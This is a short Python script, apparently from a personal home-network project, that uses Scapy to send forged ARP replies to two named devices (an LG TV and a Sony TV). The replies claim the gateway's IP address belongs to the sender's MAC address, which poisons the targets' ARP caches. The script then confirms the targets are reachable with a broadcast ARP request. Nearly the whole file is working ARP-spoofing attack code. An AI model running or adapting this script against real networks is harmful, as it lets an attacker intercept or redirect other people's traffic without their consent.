"""Send a targeted unicast ARP to force a single host to update its
ARP cache to map gateway-IP -> our MAC."""
import sys, time
sys.path.insert(0, r"C:\Users\wonma\Documents\electromesh\backend")
from scapy.all import ARP, Ether, sendp, srp

OUR_MAC = "04:d3:b0:14:79:0e"
OUR_IP  = "192.168.0.22"
GW_IP   = "192.168.0.1"
IFACE   = "Wi-Fi 2"

TARGETS = [
    ("192.168.0.12", "20:3d:bd:a8:05:7e", "LG TV"),
    ("192.168.0.16", "80:96:98:26:1b:57", "Sony TV"),
]

for ip, mac, name in TARGETS:
    print(f"--- {name} @ {ip} ({mac}) ---")
    pkt = (Ether(src=OUR_MAC, dst=mac)
           / ARP(op=2, hwsrc=OUR_MAC, psrc=GW_IP,
                 hwdst=mac, pdst=ip))
    for i in range(5):
        sendp(pkt, iface=IFACE, verbose=False)
        time.sleep(0.1)
    print(f"  sent 5 unicast ARP frames spoofing {GW_IP} -> {OUR_MAC}")

    # Also try to ARP-resolve the target back (proves L2 reachability)
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip),
        iface=IFACE, timeout=2, verbose=False,
    )
    for _snd, rcv in ans:
        print(f"  reverse-ARP confirms: {rcv.psrc} is-at {rcv.hwsrc}")
